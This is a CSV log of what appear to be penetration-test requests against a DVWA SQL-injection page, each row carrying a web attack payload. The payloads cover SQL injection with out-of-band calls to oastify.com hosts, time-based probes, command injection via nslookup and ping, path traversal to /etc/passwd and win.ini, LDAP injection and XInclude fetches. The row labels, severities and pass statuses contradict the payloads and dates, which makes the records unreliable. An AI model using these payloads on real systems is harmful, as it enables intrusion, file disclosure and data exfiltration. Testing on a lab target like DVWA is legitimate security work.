Deadline,Date of Test Executed,Project ID,Project Name,User ID,User Agent,Testing Scope,Test Case ID,Test Case,Test Case Status,Request Method,Requested Source,Test Case Outcome Message,Error Message,Actual Test Case Outcome,Reason for failure,Response Size,Findings (Affected Components),Severity ratings
05/10/2024,22/10/2024,PRJ-082,Web Application Contract Project,USER-015,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-001,Input Validation,Completed,GET,/v1/tiles,Fail,HTTP/2 204 No Content,,,,User profile page,Medium
25/10/2024,22/10/2024,PRJ-030,Risk Management Analytics Contract Project,USER-070,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-508,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cjk76mfwxfa30phwu9tmyrgna319yxsljd74uvik.oasti'%2b'fy.com%5cdck'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,Pass,,,,4289,Payment gateway,Low
14/10/2024,22/10/2024,PRJ-085,Mobile Device Encryption Contract Project,USER-049,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-509,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6gnti2skbxznl4sh5giln3jxzo5ltfh6au1hs5h.oasti'%2b'fy.com%5cvaa'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,Pass,,,,4289,User profile page,Medium
30/10/2024,22/10/2024,PRJ-063,Platform as a Service (PaaS) Contract Project,USER-008,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-510,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=(select%20load_file('%5c%5c%5c%5cvutiwr69pmdczt66j5wa1sxmddja74vvxjo6fu4.oastify.com%5c%5clzf')),Pass,,,,4289,Login form,Low
19/10/2024,22/10/2024,PRJ-030,Risk Management Analytics Contract Project,USER-067,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-511,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%2b(select%20load_file('%5c%5c%5c%5cyy0l0uactphf3wa9n80d5v1phgndb7zy2mt9kx9.oastify.com%5c%5czae'))%2b',Pass,,,,4289,Database,Low
14/10/2024,22/10/2024,PRJ-013,Wireless Network Security Contract Project,USER-065,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-512,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit',Pass,,,,4289,Login form,Low
30/10/2024,22/10/2024,PRJ-085,Mobile Device Encryption Contract Project,USER-017,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-513,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'(select*from(select(sleep(20)))a)',Pass,,,,4289,Payment gateway,High
08/10/2024,22/10/2024,PRJ-051,ERP Security Enhancement Contract Project,USER-090,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-514,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%2b(select*from(select(sleep(20)))a)%2b',Pass,,,,4289,Database,High
04/10/2024,22/10/2024,PRJ-010,Data-Driven Decision Making Contract Project,USER-026,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-515,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%20and%20(select*from(select(sleep(20)))a)--%20,Pass,,,,4289,Login form,Medium
18/10/2024,22/10/2024,PRJ-022,Mobile Application Contract Project,USER-058,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-516,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%2c(select*from(select(sleep(20)))a),Pass,,,,4289,Database,Low
09/10/2024,22/10/2024,PRJ-046,Distributed Denial of Service (DDoS) Protection Contract Project,USER-099,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-517,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%20waitfor%20delay'0%3a0%3a20'--,Pass,,,,4289,Payment gateway,Critical
07/10/2024,22/10/2024,PRJ-016,Customer Behavior Analysis Contract Project,USER-012,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-518,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit')waitfor%20delay'0%3a0%3a20'--,Pass,,,,4289,Session management,Low
17/10/2024,22/10/2024,PRJ-042,Financial Forecasting Contract Project,USER-019,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-519,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%2c0)waitfor%20delay'0%3a0%3a20'--,Pass,,,,4289,Payment gateway,Critical
31/10/2024,22/10/2024,PRJ-007,Infrastructure as a Service (IaaS) Contract Project,USER-087,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-520,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%7c%7cpg_sleep(20)--,Pass,,,,4289,User profile page,Low
26/10/2024,22/10/2024,PRJ-052,Denial of Service (DoS) Attack Contract Project,USER-058,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-521,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%20AND%20pg_sleep(20)--,Pass,,,,4289,Database,Low
07/10/2024,22/10/2024,PRJ-018,ERP Security Enhancement Contract Project,USER-016,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-522,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%2c''%7c%7cpg_sleep(20)--,Pass,,,,4289,User profile page,Medium
30/10/2024,22/10/2024,PRJ-052,Denial of Service (DoS) Attack Contract Project,USER-048,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-523,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit')AND%20pg_sleep(20)--,Pass,,,,4289,Session management,High
03/10/2024,22/10/2024,PRJ-010,Data-Driven Decision Making Contract Project,USER-003,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-524,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%2c0)AND%20pg_sleep(20)--,Pass,,,,4289,Database,Medium
30/10/2024,22/10/2024,PRJ-043,Network Access Control (NAC) Contract Project,USER-016,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-525,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit99694765'%20or%20'9409'%3d'9409,Pass,,,,4289,Login form,Medium
22/10/2024,22/10/2024,PRJ-074,Network Segmentation Contract Project,USER-056,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-526,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit57137499'%20or%20'6518'%3d'6527,Pass,,,,4289,Login form,Critical
09/10/2024,22/10/2024,PRJ-055,Mobile Application Contract Project,USER-023,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-527,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit50587254'%20or%207782%3d7782--%20,Pass,,,,4289,User profile page,High
21/10/2024,22/10/2024,PRJ-058,ERP Implementation - TechCorp Contract Project,USER-020,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-528,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit17878021'%20or%209820%3d9825--%20,Pass,,,,4289,Session management,Medium
03/10/2024,22/10/2024,PRJ-038,Cloud Storage Encryption Contract Project,USER-064,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-529,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%20and%20'4418'%3d'4418,Pass,,,,4289,Database,Low
21/10/2024,22/10/2024,PRJ-036,Email Encryption Contract Project,USER-050,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-530,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%20and%20'6280'%3d'6287,Pass,,,,4289,User profile page,Medium
12/10/2024,22/10/2024,PRJ-070,Cloud Storage Encryption Contract Project,USER-003,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-531,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%20and%206648%3d6648--%20,Pass,,,,4289,Database,Critical
01/10/2024,22/10/2024,PRJ-073,Wireless Network Security Contract Project,USER-065,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-532,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%20and%205361%3d5363--%20,Pass,,,,4289,Payment gateway,Medium
26/10/2024,22/10/2024,PRJ-041,Platform as a Service (PaaS) Contract Project,USER-077,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-533,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%22,Pass,,,,4289,Payment gateway,Low
04/10/2024,22/10/2024,PRJ-061,Marketing Campaign Effectiveness Contract Project,USER-068,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-534,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=84885p3jk1,Pass,,,,4289,User profile page,Medium
25/10/2024,22/10/2024,PRJ-032,Intrusion Detection/Prevention System (IDS/IPS) Contract Project,USER-085,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-535,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submithaxnf823f4,Pass,,,,4289,Session management,Low
08/10/2024,22/10/2024,PRJ-029,Operational Efficiency Improvement Contract Project,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-536,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%7d%7dq6oc3'%2f%22%3ck2mhy,Pass,,,,4289,User profile page,Medium
31/10/2024,22/10/2024,PRJ-076,Data Security and Privacy Contract Project,USER-041,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-537,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%25%7da3yan'%2f%22%3cyfq8q,Pass,,,,4289,Login form,High
18/10/2024,22/10/2024,PRJ-073,Wireless Network Security Contract Project,USER-073,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-538,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submitc4cej%25%3enz2sy'%2f%22%3cxfg6i,Pass,,,,4289,User profile page,Critical
08/10/2024,22/10/2024,PRJ-040,Web Application Contract Project,USER-023,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-539,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%2bsleep(20.to_i)%2b',Pass,,,,4289,Login form,Low
11/10/2024,22/10/2024,PRJ-078,Post-Implementation ERP Support Contract Project,USER-029,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-540,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',Pass,,,,4289,Database,Low
02/10/2024,22/10/2024,PRJ-079,Financial Forecasting Contract Project,USER-026,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-541,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),Pass,,,,4289,User profile page,High
31/10/2024,22/10/2024,PRJ-003,Virtual Private Network (VPN) Deployment Contract Project,USER-019,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-542,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'.sleep(20).',Pass,,,,4289,Session management,High
10/10/2024,22/10/2024,PRJ-010,Data-Driven Decision Making Contract Project,USER-048,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-543,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%7b$%7bsleep(20)%7d%7d,Pass,,,,4289,Login form,High
06/10/2024,22/10/2024,PRJ-042,Financial Forecasting Contract Project,USER-018,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-544,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=rzue1nb5uii84pb2o1166o2ii9o6c00sojbazz.oastify.com,Pass,,,,4289,Database,High
13/10/2024,22/10/2024,PRJ-091,Firewall Implementation Contract Project,USER-072,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-545,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=http%3a%2f%2f3bfqdznh6uukg1ne0ddii0euul0iocc20tnkb9.oastify.com%2f%3fSubmit,Pass,,,,4289,Session management,Medium
31/10/2024,22/10/2024,PRJ-040,Web Application Contract Project,USER-094,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-546,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=nslookup%20-q%3dcname%20gh13jctuc70xmetr6qjvodk70y6vupiil6ct3hs.oastify.com.%26,Pass,,,,4289,User profile page,Low
20/10/2024,22/10/2024,PRJ-090,Wireless Network Contract Project,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-547,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%7cnslookup%20-q%3dcname%20ssofuo46njb9xq43h2u7zpvjbah751txho4fs4.oastify.com.%26,Pass,,,,4289,Login form,Medium
05/10/2024,22/10/2024,PRJ-041,Platform as a Service (PaaS) Contract Project,USER-079,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-548,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%22%600%26nslookup%20-q%3dcname%20p0qc2lc3vgj65nc0pz247m3gj7p4dy1vpmcd02.oastify.com.%26%60',Pass,,,,4289,Login form,Critical
06/10/2024,22/10/2024,PRJ-043,Network Access Control (NAC) Contract Project,USER-096,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-549,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%26nslookup%20-q%3dcname%20h2k44devx8ly7fesrr4w9e58lzrwfq3lrce32s.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20h2k44devx8ly7fesrr4w9e58lzrwfq3lrce32s.oastify.com.%26%60',Pass,,,,4289,Payment gateway,High
07/10/2024,22/10/2024,PRJ-082,Web Application Contract Project,USER-012,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-550,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%7cecho%20xjp8dz7srb%203i6lvv5308%7c%7ca%20%23'%20%7cecho%20xjp8dz7srb%203i6lvv5308%7c%7ca%20%23%7c%22%20%7cecho%20xjp8dz7srb%203i6lvv5308%7c%7ca%20%23,Pass,,,,4289,Login form,High
24/10/2024,22/10/2024,PRJ-032,Intrusion Detection/Prevention System (IDS/IPS) Contract Project,USER-089,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-551,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%26echo%20du9zc6294i%203lwjgizd8h%26,Pass,,,,4289,Payment gateway,Low
29/10/2024,22/10/2024,PRJ-001,External Network Contract Project,USER-007,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-552,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%22%7cecho%20tquqo0luie%207uefda5qt1%20%7c%7c,Pass,,,,4289,Database,Medium
04/10/2024,22/10/2024,PRJ-053,Data Migration & Integration Contract Project,USER-064,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-553,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%7cecho%20h6nwoqwevi%20ug2eeq5igb%20%23xzwx,Pass,,,,4289,Session management,Critical
26/10/2024,22/10/2024,PRJ-062,Business Process Automation Contract Project,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-554,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1,Pass,,,,4289,Database,Low
03/10/2024,22/10/2024,PRJ-005,Customer Experience Enhancement Contract Project,USER-038,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-555,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%7cping%20-c%2021%20127.0.0.1%7c%7cx,Pass,,,,4289,Payment gateway,Low
11/10/2024,22/10/2024,PRJ-044,Network Traffic Encryption (TLS/SSL) Contract Project,USER-022,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-556,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%26ping%20-n%2021%20127.0.0.1%26,Pass,,,,4289,Login form,Low
20/10/2024,22/10/2024,PRJ-077,Marketing Campaign Effectiveness Contract Project,USER-079,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-557,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%7cping%20-c%2021%20127.0.0.1%20%23,Pass,,,,4289,Database,Medium
07/10/2024,22/10/2024,PRJ-056,External Network Contract Project,USER-021,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-558,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%22%7cping%20-n%2021%20127.0.0.1%20%7c%7c,Pass,,,,4289,Payment gateway,Medium
04/10/2024,22/10/2024,PRJ-053,Data Migration & Integration Contract Project,USER-090,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-559,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini,Pass,,,,4289,Payment gateway,Medium
01/10/2024,22/10/2024,PRJ-007,Infrastructure as a Service (IaaS) Contract Project,USER-051,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-560,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=c%3a%5cwindows%5cwin.ini,Pass,,,,4289,Login form,High
04/10/2024,22/10/2024,PRJ-055,Mobile Application Contract Project,USER-012,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-561,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini,Pass,,,,4289,Database,Medium
28/10/2024,22/10/2024,PRJ-004,Cost Optimization Contract Project,USER-027,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-562,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00Submit,Pass,,,,4289,Login form,Critical
03/10/2024,22/10/2024,PRJ-015,File Encryption Contract Project,USER-040,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-563,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,Pass,,,,4289,Database,High
12/10/2024,22/10/2024,PRJ-083,Application Modernization Contract Project,USER-070,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-564,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=%2fetc%2fpasswd,Pass,,,,4289,Payment gateway,Critical
09/10/2024,22/10/2024,PRJ-024,ERP Reporting & Analytics Implementation Contract Project,USER-058,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-565,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,Pass,,,,4289,Database,Critical
22/10/2024,22/10/2024,PRJ-029,Operational Efficiency Improvement Contract Project,USER-035,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-566,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Submit,Pass,,,,4289,Login form,Low
27/10/2024,22/10/2024,PRJ-045,Cloud-Based ERP Upgrade Contract Project,USER-070,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-567,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=...%2fSubmit,Pass,,,,4289,User profile page,Low
16/10/2024,22/10/2024,PRJ-050,Firewall Implementation Contract Project,USER-067,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-568,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=6zspe4adyq)(objectClass%3d*,Pass,,,,4289,Database,Medium
04/10/2024,22/10/2024,PRJ-039,Network Traffic Encryption (TLS/SSL) Contract Project,USER-011,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-569,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=vum0swp28x)(!(objectClass%3d*),Pass,,,,4289,Session management,Medium
05/10/2024,22/10/2024,PRJ-097,ERP Customization & Integration Contract Project,USER-058,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-570,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=*)(objectClass%3d*,Pass,,,,4289,User profile page,Medium
27/10/2024,22/10/2024,PRJ-006,Remote Work Enablement Contract Project,USER-055,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-571,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=*)(!(objectClass%3d*),Pass,,,,4289,User profile page,Medium
18/10/2024,22/10/2024,PRJ-077,Marketing Campaign Effectiveness Contract Project,USER-034,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-572,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=%3cwbp%20xmlns%3d%22http%3a%2f%2fa.b%2f%22%20xmlns%3axsi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a%2f%2fa.b%2f%20http%3a%2f%2faiwxk6uod11rn8ul7kkpp7l11s7pvjjj7au1iq.oastify.com%2fwbp.xsd%22%3ewbp%3c%2fwbp%3e,Pass,,,,4289,Login form,Critical
30/10/2024,22/10/2024,PRJ-051,ERP Security Enhancement Contract Project,USER-071,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-573,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=%3cutt%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fytvlvu5copcfyw59i8vd0vwpcgid67u8iz5qtf.oastify.com%2ffoo%22%2f%3e%3c%2futt%3e,Pass,,,,4289,Session management,Critical
05/10/2024,22/10/2024,PRJ-002,Compliance (HIPAA) Contract Project,USER-090,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-574,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit]]%3e%3e%3c,Pass,,,,4289,Database,Medium
26/10/2024,22/10/2024,PRJ-073,Wireless Network Security Contract Project,USER-076,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-575,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'%2b(function()%7bif(typeof%20xcpr7%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bxcpr7%3d1%3b%7d%7d())%2b',Pass,,,,4289,Session management,Low
